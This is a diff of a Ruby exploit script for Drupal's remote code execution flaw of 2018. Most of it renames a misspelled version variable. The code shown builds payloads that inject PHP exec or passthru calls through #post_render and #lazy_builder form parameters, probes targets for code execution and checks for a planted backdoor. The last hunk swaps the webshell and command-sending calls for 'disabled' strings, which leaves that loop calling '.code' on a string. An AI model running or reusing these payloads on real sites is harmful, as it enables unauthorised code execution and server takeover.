@@ -49,14 +49,14 @@ end
 # Function gen_evil_url <cmd>
 def gen_evil_url(evil, feedback=true)
   # PHP function to use (don't forget about disabled functions...)
-  phpmethod = $drupalverion.start_with?('8')? "exec" : "passthru"
+  phpmethod = $drupalversion.start_with?('8')? "exec" : "passthru"
 
   #puts "[*] PHP cmd: #{phpmethod}" if feedback
   puts "[*] Payload: #{evil}" if feedback
 
   ## Check the version to match the payload
   # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
-  if $drupalverion.start_with?('8')
+  if $drupalversion.start_with?('8')
     # Method #1 - Drupal 8, mail, #post_render - response is 200
     url = $target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
@@ -64,7 +64,7 @@ def gen_evil_url(evil, feedback=true)
     # Method #2 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
     #url = $target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
-  elsif $drupalverion.start_with?('7')
+  elsif $drupalversion.start_with?('7')
     # Method #3 - Drupal 7, name, #post_render - response is 200
     url = $target + "?q=user/password&name[%23post_render][]=" + phpmethod + "&name[%23type]=markup&name[%23markup]=" + evil
     payload = "form_id=user_pass&_triggering_element_name=name"
@@ -74,7 +74,7 @@ def gen_evil_url(evil, feedback=true)
   end
 
   # Drupal v7 needs an extra value from a form
-  if $drupalverion.start_with?('7')
+  if $drupalversion.start_with?('7')
     response = http_post(url, payload)
 
     form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
@@ -142,7 +142,7 @@ end
 
 
 # Try and get version
-$drupalverion = nil
+$drupalversion = nil
 # Possible URLs
 url = [
   $target + "CHANGELOG.txt",
@@ -162,14 +162,12 @@ url.each do|uri|
     puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
 
     # Try and get version from the file contents
-    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
-
-    puts "[+] try GET drupal version: #{drupalverion}"
+    $drupalversion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
 
     # If not, try and get it from the URL
-    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
+    $drupalversion = uri.match(/core/)? "8.x" : "7.x" if $drupalversion.empty?
 
-    puts "[+] try GET drupal version again: #{drupalverion}"
+    puts "[+] try GET drupal version: #{$drupalversion}"
 
     # Done!
     break
@@ -177,7 +175,7 @@ url.each do|uri|
     puts "[+] Found  : #{uri} (#{response.code})"
 
     # Get version from URL
-    $drupalverion = uri.match(/core/)? "8.x" : "7.x"
+    $drupalversion = uri.match(/core/)? "8.x" : "7.x"
   else
     puts "[!] MISSING: #{uri} (#{response.code})"
   end
@@ -185,13 +183,13 @@ end
 
 
 # Feedback
-if $drupalverion
-  status = $drupalverion.end_with?('x')? "?" : "!"
-  puts "[+] Drupal#{status}: #{$drupalverion}"
+if $drupalversion
+  status = $drupalversion.end_with?('x')? "?" : "!"
+  puts "[+] Drupal#{status}: #{$drupalversion}"
 else
   puts "[!] Didn't detect Drupal version"
   puts "[!] Forcing Drupal v8.x attack"
-  $drupalverion = "8.x"
+  $drupalversion = "8.x"
 end
 puts "-"*80
 
@@ -209,7 +207,7 @@ url, payload = gen_evil_url("echo #{random}")
 response = http_post(url, payload)
 if response.code == "200" and not response.body.empty?
   #result = JSON.pretty_generate(JSON[response.body])
-  result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+  result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
   puts "[+] Result : #{result}"
 
   puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[+] Target might to be exploitable?"
@@ -247,7 +245,7 @@ paths.each do|path|
   if response.code == "200" and not response.body.empty?
     # Feedback
     #result = JSON.pretty_generate(JSON[response.body])
-    result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+    result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
     puts "[+] Result : #{result}"
 
     # Test to see if backdoor is there (if we managed to write it)
@@ -298,13 +296,13 @@ loop do
   # If PHP shell
   if webshellpath
     # Send request
-    result = http_post("#{$target}#{webshell}", "c=#{command}").body
+    result = "WEBSHELL USAGE IS DISABLED"
   # Direct commands
   else
     url, payload = gen_evil_url(command, false)
-    response = http_post(url, payload)
+    response = "SENDING EVIL METHODS IS DISABLED"
     if response.code == "200" and not response.body.empty?
-      result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+      result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
     end
   end
 
